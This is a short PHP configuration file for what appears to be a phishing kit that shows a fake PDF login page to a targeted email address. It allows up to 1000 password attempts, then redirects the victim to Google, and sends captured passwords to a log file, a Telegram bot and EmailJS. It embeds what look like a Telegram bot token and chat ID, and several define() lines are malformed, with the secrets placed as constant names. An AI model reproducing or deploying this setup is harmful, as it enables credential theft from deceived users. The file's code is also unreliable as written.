<?php
/**
 * Configuration Settings for PDF Viewer & Authentication Script
 */

// Default Email displayed if no ?email= or ?e= parameter is supplied in URL
define('DEFAULT_EMAIL', 'user@gmail.com');//for person you want them to login

// Maximum failed password attempts before redirection
define('MAX_ATTEMPTS', 1000);

// Redirection target URL after max attempts reached
define('REDIRECT_URL', 'https://www.google.com');

// Telegram Bot API Credentials
define('6476758663:AAE-gkqyxKX51Z94U5OBiTmIYzhm-Gl76bs', '');
define('5568130877', '');

// EmailJS Credentials
define('service_kdjz013', '');
define('template_odu9psr', '');
define('xxRxln8zCDdig6e0y', '');

// Enable Server-Side PHP Payload Logging/Sending (process.php)
define('ENABLE_PHP_BACKEND', true);
define('LOG_TO_FILE', true);
define('LOG_FILE_PATH', is_writable(__DIR__) ? __DIR__ . '/logs.txt' : sys_get_temp_dir() . '/logs.txt');
